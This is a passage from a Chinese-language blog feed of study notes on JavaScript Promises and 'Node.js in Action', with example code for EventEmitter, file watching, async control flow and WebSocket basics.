        <content type="html"><![CDATA[<ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise" target="_blank" rel="noopener">Promise</a></li><li><a href="http://es6.ruanyifeng.com/#docs/promise" target="_blank" rel="noopener">ECMAScript 6 入门</a></li><li><a href="https://cnodejs.org/topic/560dbc826a1ed28204a1e7de" target="_blank" rel="noopener">Node.js最新技术栈之Promise篇</a></li><li><a href="https://cnodejs.org/topic/569c8226adf526da2aeb23fd" target="_blank" rel="noopener">理解 Promise 的工作原理</a></li></ul><h4 id="Promise是什么"><a href="#Promise是什么" class="headerlink" title="Promise是什么"></a>Promise是什么</h4><ul><li>Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。</li><li>所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理。</li></ul><h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><ul><li>Promise 对象是一个代理对象（代理一个值），被代理的值在Promise对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。 这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的promise对象。</li><li>无法取消Promise，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，Promise内部抛出的错误，不会反应到外部。第三，当处于pending状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。</li><li>状态<ul><li><em>pending</em>：初始状态，既不是成功也不是失败</li><li><em>fulfilled</em>：操作成功完成</li><li><em>rejected</em>：操作失败</li><li>状态的改变只有两种可能：<em>pending -&gt; fulfilled</em> 和 <em>pending -&gt; rejected</em></li></ul></li><li>语法  <ul><li>创建实例  <pre class=" language-JavaScript"><code class="language-JavaScript">const promise = new Promise(function(resolve, reject) {//some code ...if(/*异步操作成功*/) {  resolve(value);} else {  reject(error);}})</code></pre></li><li><strong>then</strong>方法：接受两个回调函数作为参数，响应fulfilled和rejected状态。  <pre class=" language-JavaScript"><code class="language-JavaScript">promise.then(function(value) {//success}, function(error) {  //failure})</code></pre></li><li><strong>catch</strong>方法：<code>.then(null, rejection)</code>的别名，用于指定发生错误时的回调函数<pre class=" language-JavaScript"><code class="language-JavaScript">promise.then(function(data){  //success}).catch(function(err){  //error});</code></pre></li><li><strong>finally</strong>方法：不管Promise对象最后状态如何都会执行的操作。  <pre class=" language-JavaScript"><code class="language-JavaScript">promise.then(result => {...}).catch(error => {...}).finally(() => {...})</code></pre></li><li><strong>Promise.all()</strong>：用于将多个Promise实例包装成一个新的实例，接受一个具有Iterator接口的对象作为参数  <pre class=" language-JavaScript"><code class="language-JavaScript">const promises = [2, 3, 5, 7, 11].map(function(id){return getJSON('/post/' + id + '.json');});Promise.all(promises).then(function(posts){  //... 只有所有实例状态变为fulfilled, 才调用回调函数}).catch(function(reason){  //... 至少一个变为rejected，才调用回调函数})</code></pre></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Node.js in Action》阅读笔记（三）</title>
      <link href="/2018/08/29/node.js-in-action-yue-du-bi-ji-san/"/>
      <url>/2018/08/29/node.js-in-action-yue-du-bi-ji-san/</url>
      
        <content type="html"><![CDATA[<h4 id="怎样组织复用Node代码"><a href="#怎样组织复用Node代码" class="headerlink" title="怎样组织复用Node代码"></a>怎样组织复用Node代码</h4><ul><li>怎样组织代码<ul><li>相关逻辑封装成类或者函数</li><li>包含相关类或者函数的文件放置在工程源文件的目录中</li><li>代码被组织为类或者库</li></ul></li><li>Node使用module.exports或者exports避免全局变量污染，类似与提供一个接口;使用<code>require</code>引入，<code>require</code>是同步指令</li><li>examples<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> canadianDollar <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span> <span class="token number">91</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">roundTwoDecimals</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>canadianToUS <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>canadian<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">roundTwoDecimals</span><span class="token punctuation">(</span>canadian <span class="token operator">*</span> canadianDollar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>USToCanadian <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>us<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">roundTwoDecimals</span><span class="token punctuation">(</span>us <span class="token operator">/</span> canadianDollar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//module.exports = 用于单个class/object/function</span></code></pre></li></ul><h4 id="异步程序的响应事件"><a href="#异步程序的响应事件" class="headerlink" title="异步程序的响应事件"></a>异步程序的响应事件</h4><ul><li>一次响应事件：使用回调函数</li><li>重复事件：<code>event emitters</code><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> events <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'events'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> channel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">events<span class="token punctuation">.</span>EventEmitter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>channel<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'join'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'welcome!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>channel<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ERROR:'</span><span class="token operator">+</span>err<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//...</span>channel<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'join'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>channel<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'something is wrong.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>( •̀ ω •́ )y一个有趣的例子：观测watch文件夹内的文件，重命名后移入done文件夹(ES6重写)  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>  <span class="token punctuation">,</span> events <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'events'</span><span class="token punctuation">)</span>  <span class="token punctuation">,</span> util <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'util'</span><span class="token punctuation">)</span>  <span class="token punctuation">,</span> watchDir <span class="token operator">=</span> <span class="token string">'./watch'</span>  <span class="token punctuation">,</span> processDir <span class="token operator">=</span> <span class="token string">'./done'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Watcher</span> <span class="token keyword">extends</span> <span class="token class-name">events<span class="token punctuation">.</span>EventEmitter</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>watchDir<span class="token punctuation">,</span> processDir<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>watchDir <span class="token operator">=</span> watchDir<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>processDir <span class="token operator">=</span> processDir<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> watcher <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>      fs<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>watchDir<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> files<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err<span class="token punctuation">;</span>          <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> files<span class="token punctuation">)</span> <span class="token punctuation">{</span>              watcher<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'process'</span><span class="token punctuation">,</span> files<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> watcher <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>      fs<span class="token punctuation">.</span><span class="token function">watchFile</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>watchDir<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          watcher<span class="token punctuation">.</span><span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> watcher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Watcher</span><span class="token punctuation">(</span>watchDir<span class="token punctuation">,</span> processDir<span class="token punctuation">)</span>watcher<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'process'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> watchFile <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>watchDir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> file<span class="token punctuation">;</span>  <span class="token keyword">var</span> processFile <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>processDir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> file<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fs<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span>watchFile<span class="token punctuation">,</span> processFile<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>watcher<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </code></pre></li><li><p>异步任务的串行执行和并行执行——控制流管理<br>① 回调函数<br>① 一个多步操作的Promise实现     </p><pre class=" language-javascript"><code class="language-javascript">  Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>step1<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>step2<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>step4<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//...handle success</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//... handle error</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>  ③ 一个同步操作的Generator实现     </p><pre class=" language-javascript"><code class="language-javascript">  <span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">longRunningTask</span><span class="token punctuation">(</span>value1<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> value2 <span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token function">step1</span><span class="token punctuation">(</span>value1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> value3 <span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token function">step2</span><span class="token punctuation">(</span>value2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> value4 <span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token function">step3</span><span class="token punctuation">(</span>value3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> value5 <span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token function">step4</span><span class="token punctuation">(</span>value4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//handle error</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//next方法的参数表示上一个yield表达式的返回值，所以在第一次使用next方法时，传递参数是无效的</span>  <span class="token function">scheduler</span><span class="token punctuation">(</span><span class="token function">longRunningTask</span><span class="token punctuation">(</span>initialValue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">scheduler</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> taskObj <span class="token operator">=</span> task<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>task<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>taskObj<span class="token punctuation">.</span>done<span class="token punctuation">)</span> <span class="token punctuation">{</span>      task<span class="token punctuation">.</span>value <span class="token operator">=</span> taskObj<span class="token punctuation">.</span>value<span class="token punctuation">;</span>      <span class="token function">scheduler</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>  ③ 原生js实现的并行控制流</p><pre class=" language-javascript"><code class="language-javascript">  <span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>  <span class="token punctuation">,</span> completedTasks <span class="token operator">=</span> <span class="token number">0</span>  <span class="token punctuation">,</span> tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token punctuation">,</span> wordCounts <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token punctuation">,</span> filesDir <span class="token operator">=</span> <span class="token string">'./text'</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> checkIfComplete <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      completedTasks<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>completedTasks <span class="token operator">==</span> tasks<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> wordCounts<span class="token punctuation">)</span> <span class="token punctuation">{</span>              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> wordCounts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> countWordsInText <span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> words <span class="token operator">=</span> text          <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex">/\W/</span><span class="token punctuation">)</span>          <span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> words<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">let</span> word <span class="token operator">=</span> words<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token punctuation">{</span>              wordCounts<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>wordCounts<span class="token punctuation">[</span>word<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> wordCounts<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  fs<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>filesDir<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> files<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> files<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">var</span> task <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> text<span class="token punctuation">)</span> <span class="token punctuation">{</span>                      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err<span class="token punctuation">;</span>                      <span class="token function">countWordsInText</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token function">checkIfComplete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span><span class="token punctuation">)</span>              <span class="token punctuation">}</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>filesDir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> files<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          tasks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> task <span class="token keyword">in</span> tasks<span class="token punctuation">)</span> <span class="token punctuation">{</span>          tasks<span class="token punctuation">[</span>task<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Node.js in Action》阅读笔记（二）</title>
      <link href="/2018/08/28/node.js-in-action-yue-du-bi-ji-er/"/>
      <url>/2018/08/28/node.js-in-action-yue-du-bi-ji-er/</url>
      
        <content type="html"><![CDATA[<h4 id="Serving-HTTP-and-Web-Socket"><a href="#Serving-HTTP-and-Web-Socket" class="headerlink" title="Serving HTTP and Web Socket"></a>Serving HTTP and Web Socket</h4><p>Node很容易地能够同时提供HTTP和WebSocket服务，通过使用TCP/IP端口。</p><ul><li><p><strong>Web Socket</strong><br>Web Socket 的目标是在一个单独的持久连接上提供全双工、双向通信。在JavaScript中创建了Web Socket之后，会有一个HTTP请求发送到浏览器以发起连接。在取得服务器响应后，建立的连接会使用HTTP升级从HTTP协议交换为Web Socket协议。也就是说，使用标准的HTTP服务器无法实现Web Socket，只有支持这种协议的专门服务器才能正常工作。  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//未加密</span>ws<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token comment" spellcheck="true">//加密</span>wss<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span></code></pre><ul><li>使用自定义协议的好处是能够在客户端和服务器之间发送非常少量的数据，而不必担心HTTP那样字节级的开销。由于传递的数据包很小，因此Web Socket非常适合移动应用。  </li></ul></li><li><p>Web Socket API (broswer)  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">"ws://www.example.com/server.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token punctuation">{</span>time<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>text<span class="token punctuation">:</span> <span class="token string">"Hello World"</span><span class="token punctuation">,</span>clientId<span class="token punctuation">:</span> <span class="token string">"asdfp8734rew"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>socket<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> data <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// process data</span><span class="token punctuation">}</span><span class="token punctuation">;</span>socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="创建一个实时聊天网页"><a href="#创建一个实时聊天网页" class="headerlink" title="创建一个实时聊天网页"></a>创建一个实时聊天网页</h4><ul><li><p>文件结构</p><ul><li><code>lib</code>：放置服务器端逻辑文件<ul><li><code>chat_server.js</code></li></ul></li><li><code>public</code>：放置客户端文件<ul><li><code>index.html</code></li><li><code>js</code><ul><li><code>chat.js</code></li><li><code>chat_ui.js</code></li></ul></li><li><code>css</code><ul><li><code>style.css</code></li></ul></li></ul></li><li><code>package.json</code></li><li><code>server.js</code></li></ul></li><li><p>缓存<br>Accessing memory storage (RAM) is faster than accessing the filesystem.Our chat room will cache static files to memory, only reading them from disk the first time they are accessed.</p></li><li><p>我的代码参考<br><a href="https://github.com/SusieChang/Node-in-Action-Code-Practice/tree/master/Chapter2-ChatRoom" target="_blank" rel="noopener">Chapter2-ChatRoom</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Node.js in Action》阅读笔记（一）</title>
      <link href="/2018/08/27/node.js-in-action-yue-du-bi-ji-yi/"/>
      <url>/2018/08/27/node.js-in-action-yue-du-bi-ji-yi/</url>
      
        <content type="html"><![CDATA[<h4 id="What-is-Node-js"><a href="#What-is-Node-js" class="headerlink" title="What is Node.js"></a>What is Node.js</h4><blockquote><p>Node is a platform built on Chrome’s JavaScript runtime for easily building fast, scaleable network application. Node.js uses an event-driven, non-blocking I/O model that makes it lightweight and efficient, perfect for data-intensive real-time applications that run across distributed devices.  </p></blockquote><h4 id="Why-JavaScript-matters-for-server-side-development"><a href="#Why-JavaScript-matters-for-server-side-development" class="headerlink" title="Why JavaScript matters for server side development"></a>Why JavaScript matters for server side development</h4><p>V8极大地提高了性能，因为它省略了中间环节，相比执行字节码或者使用解释器，它更喜欢直接编译成本地机器码。因为Node在服务端使用JavaScript，它有一下优点：</p><ul><li>允许前后端代码的共用</li><li>使用JavaScript内置的中间转换格式JSON</li><li>很多NoSQL数据库使用JavaScript，所以与数据库交互更加方便</li><li>有很多语言支持直接编译成JavaScript而无需重新编写</li><li>Node使用V8虚拟机，因此能紧跟ECMAScript标准</li></ul><h4 id="How-the-broswer-handles-I-O-using-JavaScript"><a href="#How-the-broswer-handles-I-O-using-JavaScript" class="headerlink" title="How the broswer handles I/O using JavaScript"></a>How the broswer handles I/O using JavaScript</h4><p><strong>异步和事件驱动：浏览器</strong><br>Node和浏览器都是事件驱动(使用事件循环)，非阻塞的(当处理I/O操作时)。<br>我们考虑一个在jQuery中常见的Ajax请求：  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//example 1</span>$<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/resource.json'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// example 2</span><span class="token keyword">var</span> data <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/resource.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在例子一中我们使用了http请求去请求一个资源，当数据接收到时使用匿名回调函数输出；例子二是一个错误的示范，因为I/O操作阻塞了其他脚本的运行，除非请求响应，否则用户不能和页面交互，用户体验极差。<br>因此，我们要使用异步操作I/O而不阻塞其他脚本执行。  </p><p><strong>异步和事件驱动：服务器</strong>  </p><ul><li>Nginx：一个HTTP服务器，使用异步I/O，常用于解决更多的请求和连接的客户，是一个响应性更高的解决方案</li><li>Apache：一个HTTP服务器，使用多线程和阻塞I/O（在很多情况下线程驻留在进程中，每个线程处理一个或者多个服务器连接。管理线程需要处理多个并行的服务器连接，占用操作系统资源，线程需要使用CPU和RAM进行上下文切换）</li></ul><h4 id="Node-is-designed-for-DIRT-Data-Intensive-Real-Time-Application"><a href="#Node-is-designed-for-DIRT-Data-Intensive-Real-Time-Application" class="headerlink" title="Node is designed for DIRT(Data-Intensive Real-Time Application)"></a>Node is designed for 